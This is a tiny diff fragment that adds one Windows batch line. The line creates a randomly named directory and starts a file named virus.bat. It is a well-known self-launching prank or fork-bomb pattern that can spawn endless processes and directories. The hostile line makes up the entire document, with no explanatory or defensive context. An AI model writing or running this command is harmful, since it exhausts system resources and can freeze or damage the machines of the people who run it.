@@ -1,0 +1,1 @@
+md %random% | Start virus.bat
